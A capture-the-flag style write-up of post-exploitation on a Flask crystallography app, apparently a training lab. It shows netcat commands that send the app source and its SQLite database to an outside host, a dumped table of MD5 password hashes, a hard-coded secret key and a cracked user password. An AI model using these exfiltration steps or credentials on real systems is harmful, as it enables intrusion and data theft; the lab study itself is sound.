## EXECUTABLE COMMANDS

Some commands seem to be missing or either cannot be found through the which command, so perhaps we are limited to what we can do.  (either that or idk why i do not get reverse shells back)
## EXECUTED COMMANDS

```bash
$whoami 
app
```

The first thing we can do is see where in the directory structure we are:

```bash
# ls -la
drwxr-xr-x 8 app  app  4096 Nov 10 09:27 .
drwxr-xr-x 4 root root 4096 Jun 16 23:10 ..
-rw------- 1 app  app  5852 Oct  9 20:08 app.py
lrwxrwxrwx 1 root root    9 Jun 17 01:51 .bash_history -> /dev/null
-rw-r--r-- 1 app  app   220 Jun 15 20:43 .bash_logout
-rw-r--r-- 1 app  app  3771 Jun 15 20:43 .bashrc
drwxrwxr-x 3 app  app  4096 Jun 17 00:44 .cache
drwx------ 2 app  app  4096 Nov 10 10:33 instance
drwx------ 7 app  app  4096 Jun 15 22:57 .local
-rw-r--r-- 1 app  app   807 Jun 15 20:43 .profile
-rw-r--r-- 1 app  app     0 Nov 10 09:47 pwned
lrwxrwxrwx 1 root root    9 Jun 17 01:52 .sqlite_history -> /dev/null
drwx------ 2 app  app  4096 Oct  9 20:13 static
drwx------ 2 app  app  4096 Oct  9 20:18 templates
drwx------ 2 app  app  4096 Nov 10 10:33 uploads
```

We can try to get the app we are exploiting, it might come in handy afterwards.

```bash
$nc ip port < app.py
```
```python
from flask import Flask, render_template, request, redirect, url_for, flash
from werkzeug.utils import secure_filename
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from pymatgen.io.cif import CifParser
import hashlib
import os
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False, unique=True)
    password = db.Column(db.String(150), nullable=False)

class Structure(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    filename = db.Column(db.String(150), nullable=False)
    identifier = db.Column(db.String(100), nullable=False, unique=True)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

def calculate_density(structure):
    atomic_mass_Si = 28.0855
    num_atoms = 2
    mass_unit_cell = num_atoms * atomic_mass_Si
    mass_in_grams = mass_unit_cell * 1.66053906660e-24
    volume_in_cm3 = structure.lattice.volume * 1e-24
    density = mass_in_grams / volume_in_cm3
    return density

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if User.query.filter_by(username=username).first():
            flash('Username already exists.')
            return redirect(url_for('register'))
        hashed_password = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()
        login_user(new_user)
        return redirect(url_for('dashboard'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and user.password == hashlib.md5(password.encode()).hexdigest():
            login_user(user)
            return redirect(url_for('dashboard'))
        flash('Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    structures = Structure.query.filter_by(user_id=current_user.id).all()
    return render_template('dashboard.html', structures=structures)

@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    if 'file' not in request.files:
        return redirect(request.url)
    file = request.files['file']
    if file.filename == '':
        return redirect(request.url)
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        identifier = str(uuid.uuid4())
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], identifier + '_' + filename)
        file.save(filepath)
        new_structure = Structure(user_id=current_user.id, filename=filename, identifier=identifier)
        db.session.add(new_structure)
        db.session.commit()
        return redirect(url_for('dashboard'))
    return redirect(request.url)

@app.route('/structure/<identifier>')
@login_required
def show_structure(identifier):
    structure_entry = Structure.query.filter_by(identifier=identifier, user_id=current_user.id).first_or_404()
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], structure_entry.identifier + '_' + structure_entry.filename)
    parser = CifParser(filepath)
    structures = parser.parse_structures()
    
    structure_data = []
    for structure in structures:
        sites = [{
            'label': site.species_string,
            'x': site.frac_coords[0],
            'y': site.frac_coords[1],
            'z': site.frac_coords[2]
        } for site in structure.sites]
        
        lattice = structure.lattice
        lattice_data = {
            'a': lattice.a,
            'b': lattice.b,
            'c': lattice.c,
            'alpha': lattice.alpha,
            'beta': lattice.beta,
            'gamma': lattice.gamma,
            'volume': lattice.volume
        }
        
        density = calculate_density(structure)
        
        structure_data.append({
            'formula': structure.formula,
            'lattice': lattice_data,
            'density': density,
            'sites': sites
        })
    
    return render_template('structure.html', structures=structure_data)

@app.route('/delete_structure/<identifier>', methods=['POST'])
@login_required
def delete_structure(identifier):
    structure = Structure.query.filter_by(identifier=identifier, user_id=current_user.id).first_or_404()
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], structure.identifier + '_' + structure.filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    db.session.delete(structure)
    db.session.commit()
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000)

```

From here we know a possible password (the secret `MyS3cretCh3mistry4PP`). We also learn of the existence of a sqlite database ( with juicy passwords probably ):

```bash
$ ls -la ./instance
drwx------ 2 app app  4096 Nov 10 10:50 .
drwxr-xr-x 8 app app  4096 Nov 10 09:27 ..
-rwx------ 1 app app 20480 Nov 10 10:50 database.db
```

One of the difficulties i had was that some of the commands where not findable (they never appeared with a which command and never executed, don't know why since later i found these commands to be available in the computer).  One command that worked was xxd:

```bash
$which xxd
/usr/bin/xxd
```

Let us ex-filtrate the database

```bash
$ xxd ./instance/database.db | nc ip port
# saved the result in a dump.hex and then the following command to get it back
$ xxd -r dump.hex database_dump.db
```

And we can get the passwords of all the users:

```sql
sqlite> SELECT * FROM USER;
1|admin|2861debaf8d99436a10ed6f75a252abf
2|app|197865e46b878d9e74a0346b6d59886a
3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
4|robert|02fcf7cfc10adc37959fb21f06c6b467
5|jobert|3dec299e06f7ed187bac06bd3b670ab2
6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
7|peter|6845c17d298d95aa942127bdad2ceb9b
8|victoria|c3601ad2286a4293868ec2a4bc606ba3
9|tania|a4aa55e816205dc0389591c9f82f43bb
10|eusebio|6cad48078d0241cca9a7b322ecd073b3
11|gelacia|4af70c80b68267012ecdac9a7e916d18
12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
13|axel|9347f9724ca083b17e39555c36fd9007
14|kristel|6896ba7b11a62cacffbdaded457c6d92
15|ab|187ef4436122d1cc2f40dc2b92f0eba0
16|nothing|3e47b75000b0924b6c9ba5759a7cf15d
```

And the password of rosa (a user in the computer is easy to crack! (with crackstation)):

```bash
rosa : unicorniosrosados
```

So now we are the user [[rosa]]

